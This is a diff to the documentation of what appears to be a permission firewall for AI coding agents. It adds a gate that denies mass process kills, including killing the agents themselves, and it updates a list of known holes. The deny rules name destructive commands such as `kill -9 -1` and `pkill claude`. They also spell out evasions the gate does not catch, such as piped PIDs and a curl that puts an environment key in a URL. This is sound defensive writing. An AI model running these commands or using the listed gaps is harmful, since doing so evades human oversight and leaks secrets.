@@ -230,6 +230,7 @@ Gates that judge command text, tool arguments or file content rather than a path
 | MCP staking, delegation or token transfer, however routed | ask | ask | ask | deny |
 | Key files: `git add`, `commit -a`, `commit <paths>` or `stash -u`/`-a` that would stage or stash a key or secret file | ask | ask | deny | deny |
 | Containers: `--privileged`, extra capabilities, host namespaces, devices, mounts of the host root, system dirs, home, credential stores or runtime sockets | ask | ask | ask | deny |
+| Process kill: `kill` of PID -1, `killall5`, `pkill`/`killall` of a coding agent (`claude`, `codex`, `opencode`, `orca`) or of every process (`pkill -v`, a match-anything pattern, a whole user, group, session or terminal) | deny | deny | deny | deny |
 | PermissionRequest: a hard-guard call whose prompt nobody would see (headless, `dontAsk`, unknown mode), or a denied call in an auto-approving mode | deny | deny | deny | deny |
 
 Production env files (`.env.production`, `.env.prod*`) are in the [project `.env` table](#project-env-files).
@@ -406,6 +407,20 @@ Off acts as Relaxed, and headless turns every ask into a deny. Ordinary runs (pu
 
 **Limits.** A compose file on standard input (`-f -`), `COMPOSE_FILE`, compose `include:` or `extends:` files, Kubernetes manifests (`podman kube play`), a flag held in a variable, and a host path spelled through a variable other than the home ones (`$PWD/..`) are not seen. Docker cleanup is a separate open item (see [Known holes](#known-holes)).
 
+## Process kill
+
+`gates/kill.rs` judges signals sent to many processes at once, in `gate-bash-secrets` (so also under Codex and opencode). Killing one process by its PID, or a worker by its own name (`pkill -f vitest`, `killall node`, `kill $(lsof -t -i :3000)`), stays silent at every tier.
+
+| What | Off | Relaxed | Medium | High |
+|---|---|---|---|---|
+| `kill` of PID -1, every process the user owns (`kill -9 -1`, `kill -KILL -1`, `kill -s KILL -1`, `kill -- -1`, a lone `kill -1`), and `killall5` | deny | deny | deny | deny |
+| `pkill` or `killall` naming a coding agent (`claude`, `codex`, `opencode`, `orca`, as a substring in any case), and `kill` of the PIDs a `pgrep` or `pidof` substitution finds for one | deny | deny | deny | deny |
+| `pkill` or `killall` of every process: a pattern that matches any name (`.`, `.*`, `^`, `''`), `pkill -v` (every process but the match), or a user, group, session or terminal with no pattern (`pkill -u "$USER"`, `pkill -s 0`, `killall -u me`) | deny | deny | deny | deny |
+
+Signal 0, which only checks that a process exists, and the list options (`kill -l`, `killall -l`) are not a kill. Positions come from the shell parser, so a commit message naming `pkill claude` is data, and the kill is found behind wrappers (`sudo`, `taskset`, `flock`, …), in `sh -c` and `watch` strings, and in the strings git runs as shell code.
+
+**Not seen:** a PID or pattern held in a variable or read from a file, PIDs piped in (`pgrep claude | xargs kill`), and a kill run from a script file. solana-ai-kit's permission rules deny `kill -9`, `killall` and `pkill` outright at Medium and High; this guard does not repeat them.
+
 ## Session report
 
 `report.rs` records what the firewall did in a session, for you. It is informational: it never blocks, and nothing in it runs on the gate hot path.
@@ -506,7 +521,7 @@ One rule, shared with the kit.
 
 The list of what this layer cannot close, and which of them the kit's sandbox and permission rules close, is in [SECURITY.md](../SECURITY.md#known-holes). Specific to this plugin's redaction: failed tool results (non-zero Bash exits, tool errors) reach the model unredacted, because Claude Code lets a hook replace only a successful result. One cost is deliberate and not a hole: the agent cannot read its own auto-memory with its tools (see [Key material and home credential stores](#key-material-and-home-credential-stores)).
 
-The full-coverage work leaves these open, as not yet covered rather than as design limits: destructive and system commands (shutdown, mass deletes beyond the wallet gates), process kill, the publish gate (`npm publish`, `cargo publish`), `docker` cleanup, and reads of shell history files (the settings manager's sandbox `denyRead` covers history for sandboxed commands). Three exfil items: an interpreter one-liner that sends a key file, an inline POST to an unknown host (it asks, at every tier, and is not denied at High), and an environment variable read inside a URL (`curl https://h/?k=$KEY`), which has no opinion at High.
+The full-coverage work leaves these open, as not yet covered rather than as design limits: destructive and system commands (shutdown, mass deletes beyond the wallet gates), the publish gate (`npm publish`, `cargo publish`), `docker` cleanup, and reads of shell history files (the settings manager's sandbox `denyRead` covers history for sandboxed commands). Three exfil items: an interpreter one-liner that sends a key file, an inline POST to an unknown host (it asks, at every tier, and is not denied at High), and an environment variable read inside a URL (`curl https://h/?k=$KEY`), which has no opinion at High.
 
 ## Migration from profiles
 
